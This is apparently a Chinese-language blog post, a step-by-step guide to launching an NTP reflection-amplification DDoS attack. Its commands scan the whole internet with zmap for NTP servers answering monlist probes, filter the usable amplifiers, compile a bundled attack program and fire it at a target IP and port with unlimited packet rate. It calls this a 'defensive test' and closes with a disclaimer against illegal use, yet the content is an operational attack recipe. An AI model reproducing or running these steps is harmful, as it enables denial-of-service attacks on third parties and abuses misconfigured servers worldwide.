---
title: ddos的初级之路
date: 2024-06-03 23:58:03
tags:
---
### ddos的初级之路

近期应朋友之托，做了一次防御安全检测，先写使用NTP的过程

1、系统环境为CentOS7

2、首先yum update后安装依赖

```
yum install epel-release -y
```

```
yum install gcc libcap libpcap libpcap-devel screen php dstat cmake gmp gmp-devel gengetopt byacc flex git json-c zmap screen -y
```

3、上传下面压缩包的内容去服务器

   压缩包中包含 探针文件 ntp_123_monlist.pkt 以及ntp反射放大脚本。

打开一个screen并使用zmap进行扫描（请注意探针文件位置）

```
screen zmap -p 123 -M udp --probe-args=file:/root/ntp_123_monlist.pkt -o monlist_fingerprint.txt
```

如果提示错误需要指定网卡，加一个-i 网卡名称，例如

```
screen zmap -i p2p1 -p 123 -M udp --probe-args=file:/root/ntp_123_monlist.pkt -o monlist_fingerprint.txt
```

然后就是漫长的等待，测试服务器使用500M带宽，扫描全网花了6个小时

扫出结果后，我们需要检查下列表内的IP哪些可以使用反射

给压缩包内的ntpchecker 777权限

```
chmod 777 ntpchecker
```

进行检查

```
./ntpchecker monlist_fingerprint.txt step1.txt 1 0 1
```

这个步骤应该10分钟就OK了，具体取决于机器性能和网络速率，怕掉线的话可以开个screen保持

检查完成后，进行格式化

```
awk '$2>419{print $1}' step1.txt | sort -n | uniq | sort -R > ntpamp.txt
```

这样我们就得到了一份可以用来进行使用的NTP列表了

压缩包内已经有了攻击程序，可以直接使用

编译压缩包内的攻击程序

```
gcc -lpthread ntp.c -lpcap -o ntp
```

到此就可以了

使用命令举例

```
./ntp 127.0.0.1 80 ntpamp.txt 1000 -1 100
```

```
127.0.0.1=目标IP
80=攻击端口
ntpamp.txt=过滤后的放大列表
1500=线程
-1=pps限制，-1表示无限制
100=攻击时间
```

请合理利用，请勿适用于非法用途